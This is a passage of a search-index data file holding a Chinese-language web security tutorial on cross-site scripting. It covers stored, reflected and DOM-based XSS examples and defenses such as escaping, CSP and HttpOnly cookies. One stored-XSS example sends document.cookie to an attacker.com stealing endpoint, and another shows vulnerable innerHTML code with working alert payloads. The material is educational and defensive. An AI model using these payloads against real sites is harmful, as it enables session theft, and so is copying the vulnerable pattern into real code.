XSS)","text":"<p>\u7279\u70b9\uff1a\u6f0f\u6d1e\u5b58\u5728\u4e8e\u5ba2\u6237\u7aef\u4ee3\u7801\u4e2d\uff0c\u6076\u610f\u811a\u672c\u4e0d\u4f1a\u7ecf\u8fc7\u670d\u52a1\u5668\uff0c\u800c\u662f\u901a\u8fc7\u4fee\u6539\u9875\u9762\u7684DOM\u7ed3\u6784\u6765\u6267\u884c\u3002</p> <p>\u653b\u51fb\u6d41\u7a0b\uff1a 1. \u653b\u51fb\u8005\u6784\u9020\u7279\u5236URL\u6216\u8bf1\u5bfc\u7528\u6237\u6267\u884c\u7279\u5b9a\u64cd\u4f5c 2. \u5ba2\u6237\u7aefJavaScript\u4ee3\u7801\u5904\u7406URL\u6216\u7528\u6237\u64cd\u4f5c\u65f6\u4ea7\u751f\u6f0f\u6d1e 3. \u6076\u610f\u811a\u672c\u5728\u5ba2\u6237\u7aef\u6267\u884c</p> <p>\u5f71\u54cd\u8303\u56f4\uff1a\u53d6\u51b3\u4e8e\u6f0f\u6d1e\u7684\u6027\u8d28\u548c\u653b\u51fb\u65b9\u5f0f\u3002</p> <p>\u5178\u578b\u573a\u666f\uff1a\u4f7f\u7528<code>document.write()</code>\u3001<code>eval()</code>\u3001<code>innerHTML</code>\u7b49\u64cd\u4f5cDOM\u7684\u5730\u65b9\u3002</p>"},{"location":"web-security/xss/#xss_3","title":"XSS\u653b\u51fb\u793a\u4f8b","text":""},{"location":"web-security/xss/#xss_4","title":"\u5b58\u50a8\u578bXSS\u793a\u4f8b","text":"<p>\u653b\u51fb\u8005\u5728\u8bc4\u8bba\u533a\u63d0\u4ea4\u4ee5\u4e0b\u5185\u5bb9\uff1a</p> <pre><code>&lt;script&gt;document.location='http://attacker.com/steal.php?cookie='+document.cookie&lt;/script&gt;\n</code></pre> <p>\u5f53\u5176\u4ed6\u7528\u6237\u67e5\u770b\u6b64\u8bc4\u8bba\u65f6\uff0c\u6076\u610f\u811a\u672c\u4f1a\u6267\u884c\u5e76\u5c06\u7528\u6237\u7684cookie\u53d1\u9001\u5230\u653b\u51fb\u8005\u7684\u670d\u52a1\u5668\u3002</p>"},{"location":"web-security/xss/#xss_5","title":"\u53cd\u5c04\u578bXSS\u793a\u4f8b","text":"<p>\u653b\u51fb\u8005\u6784\u9020\u5982\u4e0bURL\uff1a</p> <pre><code>http://example.com/search.php?q=&lt;script&gt;alert('XSS')&lt;/script&gt;\n</code></pre> <p>\u5982\u679c\u7f51\u7ad9\u76f4\u63a5\u5c06\u641c\u7d22\u53c2\u6570\u663e\u793a\u5728\u9875\u9762\u4e0a\u800c\u4e0d\u8fdb\u884c\u8f6c\u4e49\uff0c\u5f53\u7528\u6237\u70b9\u51fb\u6b64\u94fe\u63a5\u65f6\uff0c\u4f1a\u5f39\u51faalert\u5bf9\u8bdd\u6846\u3002</p>"},{"location":"web-security/xss/#domxss","title":"DOM\u578bXSS\u793a\u4f8b","text":"<p>\u5047\u8bbe\u6709\u5982\u4e0bJavaScript\u4ee3\u7801\uff1a</p> <pre><code>function displaySearchQuery() {\n    var search = document.location.search;\n    var query = search.substring(search.indexOf('q=') + 2);\n    document.getElementById('search-results').innerHTML = '\u641c\u7d22\u7ed3\u679c: ' + query;\n}\n</code></pre> <p>\u653b\u51fb\u8005\u53ef\u4ee5\u6784\u9020URL\uff1a</p> <pre><code>http://example.com/search.html?q=&lt;img src=x onerror=alert('DOM XSS')&gt;\n</code></pre>"},{"location":"web-security/xss/#xss_6","title":"XSS\u7684\u9632\u5fa1\u63aa\u65bd","text":""},{"location":"web-security/xss/#1","title":"1. \u8f93\u5165\u9a8c\u8bc1\u548c\u8fc7\u6ee4","text":"<p>\u5bf9\u6240\u6709\u7528\u6237\u8f93\u5165\u8fdb\u884c\u4e25\u683c\u7684\u9a8c\u8bc1\u548c\u8fc7\u6ee4\uff0c\u786e\u4fdd\u8f93\u5165\u7b26\u5408\u9884\u671f\u7684\u683c\u5f0f\u3002</p> <pre><code># Python\u4e2d\u4f7f\u7528html\u6a21\u5757\u8f6c\u4e49\nimport html\n\ndef sanitize_input(user_input):\n    return html.escape(user_input)\n\n# \u4f7f\u7528\nuser_input = request.args.get('input', '')\nsafe_input = sanitize_input(user_input)\n</code></pre>"},{"location":"web-security/xss/#2","title":"2. \u8f93\u51fa\u7f16\u7801","text":"<p>\u5728\u5c06\u7528\u6237\u63d0\u4f9b\u7684\u6570\u636e\u8f93\u51fa\u5230\u9875\u9762\u4e4b\u524d\uff0c\u8fdb\u884c\u9002\u5f53\u7684HTML\u7f16\u7801\uff0c\u786e\u4fdd\u7279\u6b8a\u5b57\u7b26\u4e0d\u4f1a\u88ab\u89e3\u91ca\u4e3aHTML\u6216JavaScript\u4ee3\u7801\u3002</p> <p>JavaScript\u4e2d\u4f7f\u7528\uff1a</p> <pre><code>// \u4f7f\u7528textContent\u800c\u4e0d\u662finnerHTML\ndocument.getElementById('output').textContent = userInput;\n\n// \u6216\u8005\u624b\u52a8\u8f6c\u4e49\nfunction escapeHtml(text) {\n    return text\n        .replace(/&amp;/g, \"&amp;amp;\")\n        .replace(/&lt;/g, \"&amp;lt;\")\n        .replace(/&gt;/g, \"&amp;gt;\")\n        .replace(/\"/g, \"&amp;quot;\")\n        .replace(/'/g, \"&amp;#039;\");\n}\n</code></pre>"},{"location":"web-security/xss/#3-content-security-policy-csp","title":"3. Content Security Policy (CSP)","text":"<p>\u5b9e\u73b0\u5185\u5bb9\u5b89\u5168\u7b56\u7565\uff0c\u9650\u5236\u6d4f\u89c8\u5668\u53ef\u4ee5\u6267\u884c\u7684\u811a\u672c\u6765\u6e90\uff0c\u6709\u6548\u9632\u6b62XSS\u653b\u51fb\u3002</p> <p>\u5728HTTP\u5934\u4e2d\u8bbe\u7f6e\uff1a</p> <pre><code>Content-Security-Policy: default-src 'self'; script-src 'self' trusted-cdn.com\n</code></pre> <p>\u6216\u8005\u5728HTML\u4e2d\u8bbe\u7f6e\uff1a</p> <pre><code>&lt;meta http-equiv=\"Content-Security-Policy\" content=\"default-src 'self'; script-src 'self' trusted-cdn.com\"&gt;\n</code></pre>"},{"location":"web-security/xss/#4-httponly-cookie","title":"4. \u4f7f\u7528HttpOnly Cookie","text":"<p>\u5c06Cookie\u8bbe\u7f6e\u4e3aHttpOnly\uff0c\u53ef\u4ee5\u9632\u6b62JavaScript\u8bbf\u95eeCookie\uff0c\u51cf\u8f7bXSS\u653b\u51fb\u7684\u5371\u5bb3\u3002</p> <pre><code>Set-Cookie: sessionid=abc123; HttpOnly; Secure; SameSite=Strict\n</code></pre>"},{"location":"web-security/xss/#5-x-xss-protection","title":"5. \u5b9e\u65bdX-XSS-Protection\u5934","text":"<p>\u542f\u7528\u6d4f\u89c8\u5668\u5185\u7f6e\u7684XSS\u8fc7\u6ee4\u529f\u80fd\u3002</p> <pre><code>X-XSS-Protection: 1; mode=block\n</code></pre>"},{"location":"web-security/xss/#6-javascript-api","title":"6. \u4f7f\u7528\u5b89\u5168\u7684JavaScript API","text":"<p>\u907f\u514d\u4f7f\u7528\u5371\u9669\u7684JavaScript\u51fd\u6570\uff0c\u5982\uff1a - <code>eval()</code> - <code>document.write()</code> - <code>innerHTML</code>\uff08\u4e0d\u7ecf\u8fc7\u9a8c\u8bc1\u7684\u60c5\u51b5\u4e0b\uff09 - <code>setTimeout()</code>\u548c<code>setInterval()</code>\uff08\u4f7f\u7528\u5b57\u7b26\u4e32\u53c2\u6570\u65f6\uff09</p>"},{"location":"web-security/xss/#7","title":"7. \u5b9e\u65bd\u8f93\u5165\u957f\u5ea6\u9650\u5236","text":"<p>\u9650\u5236\u7528\u6237\u8f93\u5165\u7684\u957f\u5ea6\uff0c\u51cf\u5c11\u653b\u51fb\u9762\u3002</p>"},{"location":"web-security/xss/#_1","title":"\u5b89\u5168\u7f16\u7801\u6700\u4f73\u5b9e\u8df5","text":"<ol> <li>\u6c38\u4e0d\u4fe1\u4efb\u7528\u6237\u8f93\u5165\uff1a\u5bf9\u6240\u6709\u7528\u6237\u8f93\u5165\u8fdb\u884c\u9a8c\u8bc1\u548c\u6e05\u7406</li> <li>\u8f93\u51fa\u7f16\u7801\uff1a\u5728\u663e\u793a\u7528\u6237\u6570\u636e\u524d\u8fdb\u884c\u9002\u5f53\u7684\u7f16\u7801</li> <li>\u4f7f\u7528\u73b0\u4ee3\u6846\u67b6\uff1a\u73b0\u4ee3Web\u6846\u67b6\uff08\u5982React\u3001Angular\u3001Vue\uff09\u5185\u7f6e\u4e86XSS\u9632\u62a4\u673a\u5236</li> <li>\u5b9a\u671f\u8fdb\u884c\u5b89\u5168\u6d4b\u8bd5\uff1a\u4f7f\u7528\u5de5\u5177\u5982OWASP ZAP\u8fdb\u884cXSS\u6d4b\u8bd5</li> <li>\u4fdd\u6301\u8f6f\u4ef6\u66f4\u65b0\uff1a\u53ca\u65f6\u66f4\u65b0Web\u670d\u52a1\u5668\u3001\u6846\u67b6\u548c\u5e93</li> </ol>"},{"location":"web-security/xss/#_2","title":"\u603b\u7ed3","text":"<p>XSS\u662f\u4e00\u79cd\u5e38\u89c1\u4f46\u4e25\u91cd\u7684Web\u5b89\u5168\u6f0f\u6d1e\uff0c\u901a\u8fc7\u91c7\u7528\u9002\u5f53\u7684\u9632\u5fa1\u63aa\u65bd\uff0c\u5982\u8f93\u5165\u9a8c\u8bc1\u3001\u8f93\u51fa\u7f16\u7801\u3001\u5185\u5bb9\u5b89\u5168\u7b56\u7565\u7b49\uff0c\u53ef\u4ee5\u6709\u6548\u5730\u51cf\u5c11XSS\u653b\u51fb\u7684\u98ce\u9669\u3002\u5728\u5f00\u53d1\u8fc7\u7a0b\u4e2d\uff0c\u9075\u5faa\u5b89\u5168\u7f16\u7801\u89c4\u8303\uff0c\u5b9a\u671f\u8fdb\u884c\u5b89\u5168\u6d4b\u8bd5\u662f\u786e\u4fdd\u5e94\u7528\u7a0b\u5e8f\u5b89\u5168\u7684\u5173\u952e\u3002</p>"}]}